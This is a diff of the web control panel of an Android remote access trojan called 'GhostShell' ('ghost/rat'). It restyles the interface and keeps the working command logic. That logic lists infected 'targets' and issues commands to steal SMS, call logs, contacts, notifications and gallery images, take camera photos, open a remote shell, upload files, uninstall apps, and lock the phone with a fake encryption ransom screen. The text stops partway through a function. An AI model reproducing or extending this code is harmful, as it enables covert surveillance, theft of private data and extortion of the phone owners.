@@ -2,411 +2,183 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>GhostShell | live</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GhostShell System</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        /* BASE SYSTEM STYLES */
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+        
+        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Share Tech Mono', monospace; }
+        :root { 
+            --bg: #050505; 
+            --surface: #0a0a0a; 
+            --surface-light: #111111;
+            --primary: #00ff33; /* Ijo Stabilo */
+            --primary-glow: rgba(0, 255, 51, 0.2);
+            --danger: #ff003c;
+            --text: #e0e0e0; 
+            --dim: #557755; 
+        }
+        
+        body { 
+            background: var(--bg); 
+            color: var(--text); 
+            padding: 15px; 
+            overflow-x: hidden; 
+            /* Subtle CRT Scanline effect */
+            background-image: linear-gradient(rgba(0, 255, 51, 0.03) 1px, transparent 1px),
+            linear-gradient(90deg, rgba(0, 255, 51, 0.03) 1px, transparent 1px);
+            background-size: 20px 20px;
         }
 
-        :root {
-            --bg: #0b0303;
-            --surface: #1a0e0e;
-            --card: #221212;
-            --primary-red: #ff3b3b;
-            --primary-green: #5eff9e;
-            --dark-red: #5e1a1a;
-            --dark-green: #1b4a2a;
-            --text: #e3dcdc;
-            --dim: #9e7a7a;
-            --border-red: #8b2a2a;
-            --border-green: #2f9e5a;
-            --glow-red: rgba(255, 50, 50, 0.4);
-            --glow-green: rgba(80, 255, 120, 0.5);
+        /* LOADING SCREEN */
+        #loading-screen {
+            position: fixed; inset: 0; background: #000; z-index: 9999;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            transition: opacity 0.8s ease-out;
+        }
+        .pulse-logo {
+            width: 160px; filter: drop-shadow(0 0 15px var(--primary));
+            animation: pulse 2s infinite;
+        }
+        .sys-text {
+            margin-top: 25px; color: var(--primary); font-size: 1.2rem;
+            letter-spacing: 3px; animation: blink 1s infinite;
+        }
+        @keyframes pulse { 0% { transform: scale(0.95); opacity: 0.8; } 50% { transform: scale(1.05); opacity: 1; filter: drop-shadow(0 0 25px var(--primary)); } 100% { transform: scale(0.95); opacity: 0.8; } }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+
+        /* LAYOUT */
+        .app-container { max-width: 900px; margin: 0 auto; display: flex; flex-direction: column; gap: 20px; }
+        .panel { 
+            background: var(--surface); 
+            border: 1px solid var(--dim); 
+            border-radius: 4px; /* Sudut tajam ala hacker UI */
+            padding: 20px; 
+            box-shadow: inset 0 0 20px rgba(0,0,0,0.8);
+            position: relative;
+        }
+        .panel::before { /* Aksen dekoratif di sudut panel */
+            content:''; position:absolute; top:-1px; left:-1px; width:15px; height:15px;
+            border-top: 2px solid var(--primary); border-left: 2px solid var(--primary);
         }
 
-        body {
-            background: #0a0101;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0;
-            padding: 8px;
-            background-image: radial-gradient(circle at 30% 20%, #2f130f 0%, #020000 100%);
-        }
+        /* HEADER */
+        .header { display: flex; justify-content: space-between; align-items: center; background: #000; border-bottom: 1px solid var(--primary); }
+        .header h1 { font-size: 1.4rem; color: var(--primary); text-shadow: 0 0 10px var(--primary-glow); text-transform: uppercase; letter-spacing: 2px; }
+        
+        /* VIEWS */
+        #dashboard-view { display: none; } /* Disembunyikan awalnya */
 
-        /* ---------- SYSTEM LOADER (SAME AS INDEX) ---------- */
-        .system-loader {
-            position: fixed;
-            inset: 0;
-            background: #080000;
-            z-index: 20000;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 16px;
-            transition: opacity 0.5s ease;
-            background: linear-gradient(145deg, #130404, #020101);
-            border: 2px solid #6a1f1f;
+        /* DEVICE LIST */
+        .device-item { 
+            background: var(--surface-light); padding: 15px; border-radius: 4px; margin-bottom: 12px; 
+            cursor: pointer; border: 1px solid #222; border-left: 4px solid #222;
+            transition: all 0.2s ease; line-height: 1.5; 
         }
+        .device-item:hover { border-color: var(--dim); border-left: 4px solid var(--primary); background: #162216; }
+        .device-header { display:flex; justify-content: space-between; font-size: 1.1rem; margin-bottom: 5px; color: #fff; }
+        .device-sub { font-size: 0.85rem; color: var(--dim); display: flex; gap: 15px; }
+        .sys-title { color: var(--text); border-bottom: 1px dashed var(--dim); padding-bottom: 8px; margin-bottom: 15px; font-size: 1rem; letter-spacing: 1px;}
 
-        .system-loader.fade-out {
-            opacity: 0;
-            pointer-events: none;
+        /* DASHBOARD STATUS & GRID */
+        .top-controls { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+        .status-bar { 
+            display: flex; gap: 20px; background: #000; padding: 12px 20px; 
+            border: 1px solid #222; border-radius: 4px; font-size: 0.95rem; flex: 1;
         }
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 12px; }
+        
+        /* BUTTONS */
+        .btn { 
+            background: #0a0a0a; border: 1px solid #333; border-radius: 4px; padding: 15px 5px; 
+            text-align: center; color: var(--dim); cursor: pointer; font-size: 0.85rem; transition: 0.2s; 
+        }
+        .btn i { display: block; font-size: 1.6rem; margin-bottom: 10px; color: var(--primary); opacity: 0.8; }
+        .btn:hover { border-color: var(--primary); color: var(--primary); box-shadow: inset 0 0 10px var(--primary-glow); }
+        .btn:hover i { opacity: 1; text-shadow: 0 0 8px var(--primary); }
+        .btn.active { border-color: var(--danger); color: var(--danger); }
+        .btn.active i { color: var(--danger); }
+        
+        button.action-btn { 
+            background: transparent; color: var(--primary); font-weight: bold; border: 1px solid var(--primary); 
+            padding: 8px 15px; border-radius: 2px; cursor: pointer; transition: 0.2s; text-transform: uppercase;
+        }
+        button.action-btn:hover { background: var(--primary); color: #000; box-shadow: 0 0 15px var(--primary-glow); }
+        button.action-btn.red { border-color: var(--danger); color: var(--danger); }
+        button.action-btn.red:hover { background: var(--danger); color: #000; box-shadow: 0 0 15px rgba(255,0,60,0.3); }
 
-        .boot-sequence {
-            width: 100%;
-            max-width: 400px;
-            background: #120808;
-            border: 2px solid #aa2b2b;
-            box-shadow: 0 0 40px #a83030;
-            padding: 24px 18px;
-            border-radius: 40px;
-            text-align: center;
+        /* MODAL & TERMINAL */
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(3px); z-index: 100; align-items: center; justify-content: center; padding: 15px; }
+        .modal-card { background: #050505; width: 100%; max-width: 850px; max-height: 90vh; border-radius: 4px; border: 1px solid var(--primary); display: flex; flex-direction: column; box-shadow: 0 0 30px rgba(0,255,51,0.1); }
+        .modal-header { padding: 15px 20px; background: #0a0a0a; display: flex; justify-content: space-between; border-bottom: 1px solid #222; }
+        .modal-body { padding: 20px; overflow-y: auto; flex: 1; font-size: 0.9rem; }
+        .modal-footer { padding: 15px; background: #0a0a0a; display: flex; gap: 10px; flex-wrap: wrap; border-top: 1px solid #222; }
+        
+        .terminal { 
+            background: #000; color: var(--primary); padding: 15px; border-radius: 2px; 
+            height: 350px; overflow-y: auto; border: 1px solid #222; margin-bottom: 10px; white-space: pre-wrap;
+            box-shadow: inset 0 0 15px rgba(0,255,51,0.05); text-shadow: 0 0 2px rgba(0,255,51,0.5);
         }
-
-        .boot-logo {
-            width: 130px;
-            margin: 0 auto 15px;
-            filter: drop-shadow(0 0 20px #44ff88) drop-shadow(0 0 30px #ff3b3b);
-            animation: throb 2s infinite alternate;
-        }
-
-        .boot-logo img {
-            width: 100%;
-            height: auto;
-            display: block;
-        }
-
-        .boot-text {
-            color: #f0ffd0;
-            font-size: 1.2rem;
-            letter-spacing: 3px;
-            font-weight: 300;
-            text-shadow: 0 0 8px #64ff9e, 0 0 12px #ff4f4f;
-            margin-bottom: 16px;
-        }
-
-        .boot-bar {
-            width: 100%;
-            height: 8px;
-            background: #2d1212;
-            border-radius: 20px;
-            border: 1px solid #aa3c3c;
-            overflow: hidden;
-            margin: 10px 0;
-        }
-
-        .boot-fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #ff3a3a, #6aff99, #ff3737);
-            box-shadow: 0 0 20px #5eff8c;
-            transition: width 0.3s ease;
-        }
-
-        .boot-status {
-            color: #9affb5;
-            font-family: monospace;
-            font-size: 0.9rem;
-            display: flex;
-            justify-content: space-between;
-            padding: 0 5px;
-        }
-
-        @keyframes throb {
-            0% { filter: drop-shadow(0 0 5px #ff3b3b) drop-shadow(0 0 15px #5eff99); }
-            100% { filter: drop-shadow(0 0 25px #ff6565) drop-shadow(0 0 35px #5eff99); }
-        }
-
-        /* ---------- MAIN DASHBOARD ---------- */
-        #main-app {
-            display: none;
-            width: 100%;
-            max-width: 480px;
-            margin: 0 auto;
-        }
-
-        .app-container {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-
-        .panel {
-            background: #140a0a;
-            border: 2px solid #6d2b2b;
-            border-radius: 32px;
-            padding: 16px 14px;
-            box-shadow: 0 10px 20px -10px #5e0000, inset 0 0 15px #2f0707;
-            background: linear-gradient(160deg, #1d0d0d, #0e0404);
-            width: 100%;
-        }
-
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-color: #bb4646;
-            padding: 12px 14px;
-        }
-
-        .header h1 {
-            font-size: 1.3rem;
-            color: #ff8686;
-        }
-
-        .status-bar {
-            background: #231212;
-            border: 1px solid #c74545;
-            border-radius: 40px;
-            padding: 10px 16px;
-            display: flex;
-            justify-content: space-between;
-            color: #eaffd6;
-            font-size: 0.9rem;
-            margin-bottom: 12px;
-        }
-
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 8px;
-        }
-
-        .grid .btn {
-            background: #2a1616;
-            border: 2px solid #50a56b;
-            border-radius: 24px;
-            padding: 14px 4px;
-            text-align: center;
-            color: #b7ffcc;
-            cursor: pointer;
-            font-size: 0.7rem;
-            box-shadow: 0 3px 0 #3e1313;
-            -webkit-tap-highlight-color: transparent;
-            transition: 0.1s;
-        }
-
-        .btn i {
-            display: block;
-            font-size: 1.6rem;
-            margin-bottom: 4px;
-            color: #ff7272;
-        }
-
-        .btn:active {
-            transform: translateY(2px);
-            box-shadow: 0 1px 0 #3e1313;
-            border-color: #ff7676;
-        }
-
-        .btn.active {
-            border-color: #ff5e5e;
-            box-shadow: 0 0 0 2px #fbffb0, 0 3px 0 #581c1c;
-        }
-
-        #device-list {
-            max-height: 200px;
-            overflow-y: auto;
-            -webkit-overflow-scrolling: touch;
-            padding-right: 4px;
-        }
-
-        .device-item {
-            background: #1d0f0f;
-            border-radius: 24px;
-            padding: 12px 14px;
-            margin-bottom: 8px;
-            border-left: 6px solid #d64747;
-            cursor: pointer;
-            font-size: 0.9rem;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        .device-item.active {
-            border-left-color: #76ffa0;
-            background: #2e1b1b;
-            box-shadow: 0 0 0 2px #ff8888;
-        }
-
-        .modal {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.96);
-            backdrop-filter: blur(8px);
-            align-items: center;
-            justify-content: center;
-            padding: 12px;
-            z-index: 1100;
-        }
-
-        .modal-card {
-            background: #1d0d0d;
-            border: 3px solid #ff6b6b;
-            border-radius: 40px;
-            width: 100%;
-            max-width: 440px;
-            max-height: 85vh;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .modal-header {
-            padding: 16px 18px;
-            background: #1d0a0a;
-            display: flex;
-            justify-content: space-between;
-            border-radius: 40px 40px 0 0;
-        }
-
-        .modal-body {
-            padding: 16px;
-            overflow-y: auto;
-            background: #1c0c0c;
-            -webkit-overflow-scrolling: touch;
-        }
-
-        .modal-footer {
-            padding: 14px;
-            background: #1f0b0b;
-            border-radius: 0 0 40px 40px;
-            display: flex;
-            flex-wrap: wrap;
-            gap: 8px;
-        }
-
-        .data-table {
-            width: 100%;
-            border-collapse: collapse;
-            color: #e0d5d5;
-            font-size: 0.9rem;
-        }
-        .data-table th {
-            text-align: left;
-            color: #ffa8a8;
-            border-bottom: 2px solid #ba4a4a;
-            padding: 8px 4px;
-        }
-        .data-table td {
-            padding: 8px 4px;
-            border-bottom: 1px solid #5e3333;
-            vertical-align: top;
-        }
-
-        .terminal {
-            background: #080202;
-            color: #b3ffc1;
-            font-family: monospace;
-            padding: 16px;
-            border-radius: 24px;
-            height: 220px;
-            overflow: auto;
-            border: 2px solid #7affa8;
-            font-size: 0.85rem;
-        }
-
-        .gal-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 8px;
-        }
-
-        .gal-item img {
-            width: 100%;
-            height: 80px;
-            object-fit: cover;
-            border-radius: 16px;
-            border: 2px solid #fc6b6b;
-        }
-
-        input, textarea {
-            background: #2b1616;
-            border: 2px solid #cf5a5a;
-            padding: 12px 16px;
-            border-radius: 40px;
-            color: white;
-            width: 100%;
-            font-size: 1rem;
-        }
-
-        button {
-            background: #c24f4f;
-            border: none;
-            color: black;
-            font-weight: bold;
-            padding: 10px 18px;
-            border-radius: 40px;
-            cursor: pointer;
-            font-size: 0.9rem;
-            -webkit-tap-highlight-color: transparent;
-        }
-        button:active { opacity: 0.8; }
-        .red-btn { background: #ff2727; color: white; }
-
-        @media (min-width: 480px) {
-            .grid { grid-template-columns: repeat(5, 1fr); }
-        }
+        
+        /* TABLES & FORMS */
+        table { width: 100%; border-collapse: collapse; }
+        th { color: var(--dim); border-bottom: 1px solid #333; padding: 10px; text-align: left; text-transform: uppercase; font-size: 0.8rem; }
+        td { padding: 10px; border-bottom: 1px solid #111; color: var(--text); font-size: 0.9rem; }
+        input, textarea { background: #0a0a0a; border: 1px solid #333; padding: 12px; border-radius: 2px; color: var(--primary); width: 100%; outline: none; transition: 0.3s; }
+        input:focus, textarea:focus { border-color: var(--primary); box-shadow: inset 0 0 5px var(--primary-glow); }
+        
+        .gal-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 10px; }
+        .gal-item img { width: 100%; height: 100px; object-fit: cover; border-radius: 2px; border: 1px solid #333; }
+        .gal-item img:hover { border-color: var(--primary); }
     </style>
 </head>
 <body>
-    <!-- SYSTEM LOADING SCREEN -->
-    <div id="systemLoader" class="system-loader">
-        <div class="boot-sequence">
-            <div class="boot-logo">
-                <img src="https://i.ibb.co.com/Y7YpxtHt/logogs-removebg-preview.png" alt="ghost">
-            </div>
-            <div class="boot-text">DASHBOARD INIT</div>
-            <div class="boot-bar">
-                <div class="boot-fill" id="bootFill" style="width: 0%;"></div>
-            </div>
-            <div class="boot-status">
-                <span id="bootMsg">establishing link...</span>
-                <span id="bootPercent">0%</span>
-            </div>
-        </div>
+    <div id="loading-screen">
+        <img src="https://i.ibb.co.com/Y7YpxtHt/logogs-removebg-preview.png" alt="GhostShell" class="pulse-logo">
+        <div class="sys-text">SYSTEM INITIALIZING...</div>
     </div>
 
-    <!-- MAIN DASHBOARD (awalnya hidden, akan ditampilkan setelah loading) -->
-    <div id="main-app">
-        <div class="app-container">
-            <header class="panel header">
-                <h1><i class="fas fa-skull"></i> ghost/rat</h1>
-                <div style="display:flex; gap:10px; align-items:center;">
-                    <span style="color:#b1ffb1; font-size:0.9rem;"><i class="fa-regular fa-id-card"></i> <span id="user-display">visitor</span></span>
-                    <button onclick="logout()" style="background:#4d2727; border:2px solid #ff6a6a; padding:6px 12px;">✕</button>
+    <div class="app-container">
+        <header class="panel header">
+            <h1><i class="fas fa-terminal"></i> GhostShell_OS</h1>
+            <div style="display:flex; align-items:center; gap:15px;">
+                <div style="color:var(--dim); font-size:0.9rem;">
+                    [UID: <span id="user-display" style="color:var(--primary)"></span>]
                 </div>
-            </header>
-
-            <div class="panel">
-                <h3 style="color:#ffa3a3; margin-bottom:12px; font-size:1.1rem;"><i class="fa-regular fa-compass"></i> TARGETS</h3>
-                <div id="device-list">scanning...</div>
+                <button onclick="logout()" class="action-btn red" style="font-size: 0.7rem; padding: 5px 10px;">DISCONNECT</button>
             </div>
+        </header>
 
-            <div class="panel">
+        <div id="selection-view" class="panel">
+            <h3 class="sys-title"><i class="fas fa-satellite-dish"></i> DETECTED TARGETS</h3>
+            <div id="device-list" style="margin-top: 15px;">
+                <div style="color:var(--dim);">Scanning network for endpoints...</div>
+            </div>
+        </div>
+
+        <div id="dashboard-view" class="panel">
+            <div class="top-controls">
+                <button onclick="backToSelection()" class="action-btn" style="border-color: #555; color: #ccc;">
+                    <i class="fas fa-chevron-left"></i> BACK
+                </button>
                 <div class="status-bar">
-                    <span>🎯 <b id="sel-info" style="color:#b3ffb3;">None</b></span>
-                    <span>📶 <b id="conn-stat" style="color:#ff5e5e;">OFF</b></span>
+                    <span>TARGET: <b id="sel-info" style="color:var(--primary);">None</b></span>
+                    <span>LINK: <b id="conn-stat" style="color:var(--danger);">OFFLINE</b></span>
                 </div>
-                <div class="grid" id="main-grid"></div>
             </div>
+            
+            <h3 class="sys-title" style="margin-top: 10px;"><i class="fas fa-microchip"></i> EXECUTE COMMAND</h3>
+            <div class="grid" id="main-grid"></div>
         </div>
     </div>
 
-    <!-- MODAL -->
     <div id="modal" class="modal">
         <div class="modal-card">
             <div class="modal-header">
-                <h3 id="modal-title" style="color:#ffa8a8;">MODAL</h3>
-                <span style="cursor:pointer; font-size:2rem;" onclick="closeModal()">&times;</span>
+                <h3 id="modal-title" style="color:var(--primary); text-transform: uppercase;">MODAL</h3>
+                <span style="cursor:pointer; font-size:1.5rem; color: var(--dim);" onclick="closeModal()">&times;</span>
             </div>
             <div class="modal-body" id="modal-body"></div>
             <div class="modal-footer" id="modal-footer"></div>
@@ -414,329 +186,211 @@
     </div>
 
     <script>
-        (function() {
-            // ---------- AUTH CHECK (harus paling awal) ----------
-            const uid = localStorage.getItem('ghost_uid');
-            if (!uid) {
-                window.location.href = '/';
+        // --- UI LOGIC MODIFICATIONS ---
+        window.onload = () => {
+            setTimeout(() => {
+                const loader = document.getElementById('loading-screen');
+                loader.style.opacity = '0';
+                setTimeout(() => loader.style.display = 'none', 800);
+            }, 2500); // Tampil 2.5 detik awal
+        };
+
+        function selectTarget(id) {
+            selId = id;
+            document.getElementById('selection-view').style.display = 'none';
+            document.getElementById('dashboard-view').style.display = 'block';
+            updateMain();
+        }
+
+        function backToSelection() {
+            selId = null;
+            document.getElementById('dashboard-view').style.display = 'none';
+            document.getElementById('selection-view').style.display = 'block';
+        }
+
+        // --- ORIGINAL SYSTEM LOGIC (UNTOUCHED) ---
+        const myUid = localStorage.getItem('ghost_uid');
+        if(!myUid) location.href = '/';
+        document.getElementById('user-display').innerText = myUid;
+
+        let state = { devices: [] }, selId = null, curMod = null, cache = {}, hash = "", termOut = "", flash = false, mediaRecorder, audioChunks = [];
+
+        async function cmd(c, b={}) {
+            if(!selId) return;
+            await fetch('/api/command', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({cmd:c, client_id:selId, ...b})});
+        }
+
+        function logout() { localStorage.removeItem('ghost_uid'); location.href = '/'; }
+
+        function openModal(t) {
+            curMod = t; hash = "";
+            document.getElementById('modal').style.display = 'flex';
+            document.getElementById('modal-title').innerText = t.replace('_', ' ');
+            const b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
+            b.innerHTML = ""; f.innerHTML = "";
+
+            if(t === 'filemanager') {
+                termOut = "root@ghost_os:~# Establishing remote shell...\nroot@ghost_os:~# Shell Active.\n";
+                b.innerHTML = `<div class="terminal" id="terminal">${termOut}</div><div style="display:flex; gap:10px; background:#000; padding:12px; border:1px solid #333; border-radius:2px;"><span style="color:var(--primary)">root@target:~#</span><input id="term-in" style="background:transparent; border:none; color:var(--primary); outline:none; width:100%; padding:0;" autofocus onkeydown="if(event.key==='Enter') execShell()"></div>`;
+                f.innerHTML = `<button class="action-btn" onclick="document.getElementById('up-file').click()">[+] UPLOAD FILE</button><input type="file" id="up-file" style="display:none" onchange="uploadShellFile(this)">`;
+                cmd('filemanager'); return;
+            } else if(t === 'panic') {
+                b.innerHTML = `<p style="color:var(--dim); margin-bottom:5px;">Duration (sec):</p><input type="number" id="psec" value="30"><p style="margin-top:15px; color:var(--dim); margin-bottom:5px;">Hell Message:</p><textarea id="pmsg" style="height:100px;">YOU ARE HACKED!</textarea>`;
+                f.innerHTML = `<button class="action-btn red" style="width:100%" onclick="cmd('panic '+document.getElementById('psec').value+'|'+document.getElementById('pmsg').value.replace(/\\n/g,'<br>'))">EXECUTE HELL</button><button class="action-btn" onclick="cmd('stop_panic')">ABORT</button>`;
+                return;
+            } else if(t === 'voice') {
+                b.innerHTML = `<div style="text-align:center; padding:30px;"><i id="v-icon" class="fas fa-microphone" style="font-size:4rem; color:var(--dim); margin-bottom:15px;"></i><p id="v-stat" style="color:var(--primary)">Awaiting Input...</p></div>`;
+                f.innerHTML = `<button id="v-start" class="action-btn" style="width:100%;" onclick="startRec()">START RECORDING</button><button id="v-stop" onclick="stopRec()" style="display:none; width:100%;" class="action-btn red">STOP & TRANSMIT</button>`;
+                return;
+            } else if(t === 'setwallpaper') {
+                b.innerHTML = `<p style="color:var(--dim); margin-bottom:5px;">Upload Local:</p><input type="file" onchange="uploadWall(this)"><p style="margin-top:15px; color:var(--dim); margin-bottom:5px;">Inject URL:</p><input id="wurl" placeholder="https://domain.com/img.jpg">`;
+                f.innerHTML = `<button class="action-btn" onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY PAYLOAD</button>`;
+                return;
+            } else if(t === 'toast') {
+                b.innerHTML = `<p style="color:var(--dim); margin-bottom:5px;">System Message:</p><textarea id="lmsg" style="height:100px;">SYSTEM CRITICAL ERROR\\nYour data is being encrypted.</textarea><p style="margin-top:15px; color:var(--dim); margin-bottom:5px;">Unlock PIN:</p><input id="lpin" value="1337" style="text-align:center; font-size:1.5rem; letter-spacing: 5px;">`;
+                f.innerHTML = `<button class="action-btn red" style="width:100%" onclick="cmd('lock '+document.getElementById('lmsg').value.replace(/\\n/g, '<br>')+'|'+document.getElementById('lpin').value)">LOCK DEVICE</button><button class="action-btn" onclick="cmd('unlock')">FORCE UNLOCK</button>`;
+                return;
+            } else if(t === 'vibrate') {
+                b.innerHTML = `<p style="color:var(--dim); margin-bottom:5px;">Duration (Seconds):</p><input type="number" id="vsec" value="5">`;
+                f.innerHTML = `<button class="action-btn" style="width:100%;" onclick="cmd('vibrate '+document.getElementById('vsec').value)">EXECUTE</button>`;
+                return;
+            } else if(t === 'open_url') {
+                b.innerHTML = `<p style="color:var(--dim); margin-bottom:5px;">Target URL:</p><input id="ourl" value="https://google.com">`;
+                f.innerHTML = `<button class="action-btn" style="width:100%;" onclick="cmd('openurl '+document.getElementById('ourl').value)">FORCE OPEN</button>`;
                 return;
             }
-            document.getElementById('user-display').innerText = uid;
 
-            // ---------- LOADING SCREEN SIMULATION ----------
-            const loader = document.getElementById('systemLoader');
-            const bootFill = document.getElementById('bootFill');
-            const bootMsg = document.getElementById('bootMsg');
-            const bootPercent = document.getElementById('bootPercent');
-            const mainApp = document.getElementById('main-app');
-            
-            let progress = 0;
-            const interval = setInterval(() => {
-                progress += 4;
-                if (progress >= 100) {
-                    progress = 100;
-                    clearInterval(interval);
-                    bootMsg.innerText = '>> READY <<';
-                    bootPercent.innerText = '100%';
-                    bootFill.style.width = '100%';
-                    
-                    // HIDE LOADER DAN TAMPILKAN DASHBOARD
-                    setTimeout(() => {
-                        loader.classList.add('fade-out');
-                        // Tampilkan dashboard
-                        mainApp.style.display = 'block';
-                        
-                        // Sembunyikan loader sepenuhnya setelah fade out
-                        setTimeout(() => {
-                            loader.style.display = 'none';
-                        }, 500);
-                    }, 400);
-                }
-                bootFill.style.width = progress + '%';
-                bootPercent.innerText = progress + '%';
+            const map = { sms:'getsms', calls:'getcalllogs', apps:'list_app', notifications:'getnotifications', takebackpic:'takebackpic', takefrontpic:'takefrontpic', contacts:'getcontacts', info:'deviceinfo', gallery:'gallery' };
+            if(map[t]) cmd(map[t]);
+            render();
+        }
+
+        function execShell() {
+            const inp = document.getElementById('term-in'); if(!inp.value.trim()) return;
+            cmd(inp.value.trim()); termOut += `# ${inp.value}\n`;
+            document.getElementById('terminal').innerText = termOut; inp.value = "";
+        }
+
+        async function startRec() {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            mediaRecorder = new MediaRecorder(stream); audioChunks = [];
+            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+            mediaRecorder.onstop = sendAudio; mediaRecorder.start();
+            document.getElementById('v-icon').style.color = 'var(--danger)'; document.getElementById('v-stat').innerText = '[ RECORDING IN PROGRESS ]';
+            document.getElementById('v-start').style.display = 'none'; document.getElementById('v-stop').style.display = 'block';
+        }
+        function stopRec() { mediaRecorder.stop(); }
+        async function sendAudio() {
+            const audioBlob = new Blob(audioChunks, { type: 'audio/mpeg' });
+            const formData = new FormData(); formData.append('file', audioBlob);
+            const res = await fetch('/api/upload_voice', { method: 'POST', body: formData });
+            const data = await res.json();
+            if(data.status === 'ok') cmd('play_voice ' + window.location.origin + '/captured_images/' + data.filename);
+            setTimeout(closeModal, 1500);
+        }
+
+        async function uploadWall(input) {
+            const formData = new FormData(); formData.append('file', input.files[0]);
+            const res = await fetch('/api/upload_wallpaper', {method:'POST', body:formData});
+            const data = await res.json();
+            if(data.status === 'ok') cmd('set_wallpaper ' + window.location.origin + '/captured_images/' + data.filename);
+        }
+
+        async function uploadShellFile(input) {
+            const formData = new FormData(); formData.append('file', input.files[0]);
+            const res = await fetch('/api/upload_wallpaper', {method:'POST', body:formData});
+            const data = await res.json();
+            if(data.status === 'ok') cmd(`upload ${btoa(data.filename)} ${btoa(window.location.origin + '/captured_images/' + data.filename)}`);
+        }
+
+        function closeModal() { if(curMod === 'gallery') cmd('exit_gallery'); if(curMod === 'filemanager') cmd('exit_shell'); document.getElementById('modal').style.display = 'none'; curMod = null; }
+
+        function render() {
+            if(!curMod || !selId || !cache[selId]) return;
+            const d = cache[selId], b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
+            if(curMod === 'filemanager') {
+                const fm = d.fm; if(hash === JSON.stringify(fm)) return; hash = JSON.stringify(fm);
+                let out = `Path: ${fm.path}\n\n`;
+                fm.files.forEach(x => out += `${x.isDirectory?'[DIR] ':'[FILE]'} ${x.name}\n`);
+                termOut += out; document.getElementById('terminal').innerText = termOut;
+                document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight; return;
+            }
+            if(['panic', 'vibrate', 'open_url', 'setwallpaper', 'voice', 'toast'].includes(curMod)) return;
+            const curHash = JSON.stringify(d[curMod] || d.info || d.media || d.notifications || "");
+            if(hash === curHash) return; hash = curHash;
+            b.innerHTML = "";
+
+            if(curMod === 'info') {
+                const i = d.info;
+                b.innerHTML = `<table><tr><td>Model</td><td>${i.Model}</td></tr><tr><td>Vendor</td><td>${i.Manufacturer}</td></tr><tr><td>OS Base</td><td>Android ${i.AndroidVersion}</td></tr><tr><td>Location</td><td>${i.Country}</td></tr><tr><td>Power</td><td>${i.Battery}</td></tr><tr><td>Network</td><td>${i.WiFi}</td></tr><tr><td>SIM_1</td><td>${i.SIM1 || 'NULL'}</td></tr><tr><td>SIM_2</td><td>${i.SIM2 || 'NULL'}</td></tr><tr><td>Phone_No</td><td>${i.PhoneNumber}</td></tr></table>`;
+            } else if(curMod === 'apps') {
+                b.innerHTML = `<table><tr><th>Package Name</th><th>Execute</th></tr>${d.apps.map(a=>`<tr><td><b style="color:var(--text)">${a.appName}</b><br><small style="color:var(--dim)">${a.packageName}</small></td><td style="text-align:right;"><button class="action-btn" style="padding:5px 10px; font-size:0.7rem;" onclick="cmd('run ${a.packageName}')">RUN</button> <button class="action-btn red" style="padding:5px 10px; font-size:0.7rem;" onclick="cmd('uninstall ${a.packageName}')">DEL</button></td></tr>`).join('')}</table>`;
+            } else if(curMod === 'sms') {
+                b.innerHTML = `<table><tr><th>Target/Sender</th><th>Payload</th></tr>${d.sms.map(l=>`<tr><td style="color:var(--primary)">${l.userSender}</td><td>${l.content}</td></tr>`).join('')}</table>`;
+            } else if(curMod === 'calls') {
+                b.innerHTML = `<table><tr><th>Identifier</th><th>Time (Sec)</th></tr>${d.calls.map(l=>`<tr><td style="color:var(--primary)">${l.number}</td><td>${l.duration_seconds}s</td></tr>`).join('')}</table>`;
+            } else if(curMod === 'contacts') {
+                b.innerHTML = `<table><tr><th>Entity Name</th><th>Route Number</th></tr>${d.contacts.map(c=>`<tr><td>${c.name}</td><td style="color:var(--primary)">${c.number}</td></tr>`).join('')}</table>`;
+            } else if(curMod === 'gallery') {
+                b.innerHTML = `<div class="gal-grid">${d.gallery.files.map(x=>`<div class="gal-item"><img src="data:image/jpeg;base64,${x.thumbnail}"/><p style="font-size:0.6rem; margin-top:5px; color:var(--dim); word-break:break-all;">${x.name}</p></div>`).join('')}</div>`;
+                f.innerHTML = `<button class="action-btn" onclick="cmd('gallery back')"><i class="fas fa-chevron-left"></i></button><span style="color:var(--primary); font-weight:bold; padding:0 15px;">DIR_PAGE: ${d.gallery.page}</span><button class="action-btn" onclick="cmd('gallery next')"><i class="fas fa-chevron-right"></i></button>`;
+            } else if(curMod.includes('pic')) {
